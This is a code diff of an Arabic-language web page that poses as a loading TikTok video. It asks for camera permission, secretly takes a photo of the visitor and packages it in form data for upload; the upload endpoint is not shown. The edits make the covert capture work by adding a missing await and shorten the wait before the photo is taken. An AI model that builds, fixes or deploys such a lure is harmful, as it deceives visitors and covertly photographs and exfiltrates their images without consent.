@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title> جاري التشغيل الان...</title>
+  <title>جاري التشغيل الان...</title>
   <style>
     body {
       margin: 0;
@@ -33,7 +33,6 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const track = stream.getVideoTracks()[0];
 
-        // تأكد من أن الجهاز يدعم ImageCapture
         if (!("ImageCapture" in window)) {
           document.getElementById("status").innerText = "❌ المتصفح لا يدعم ImageCapture.";
           return;
@@ -43,10 +42,9 @@
 
         document.getElementById("status").innerText = "📷 انتظر، يتم تشغيل فيديو التيك توك...";
 
-        // ننتظر 5 ثواني لتشغيل الكاميرا بشكل فعلي
         setTimeout(async () => {
           try {
-            const blob =  imageCapture.takePhoto();
+            const blob = await imageCapture.takePhoto();  // ← استخدم await هنا
             stream.getTracks().forEach(t => t.stop());
 
             const formData = new FormData();
@@ -64,9 +62,9 @@
               document.getElementById("status").innerText = "❌ خطأ بالشبكة.";
             });
           } catch (err) {
-            document.getElementById("status").innerText = "❌ فشل في تشغيل الفيديو التيك توك.";
+            document.getElementById("status").innerText = "❌ فشل في تشغيل فيديو التيك توك.";
           }
-        }, 5000);
+        }, 3000); // ← هنا قللنا الانتظار لـ 3 ثواني
 
       } catch (err) {
         document.getElementById("status").innerText = "❌ فشل في تشغيل فيديو التيك توك.";
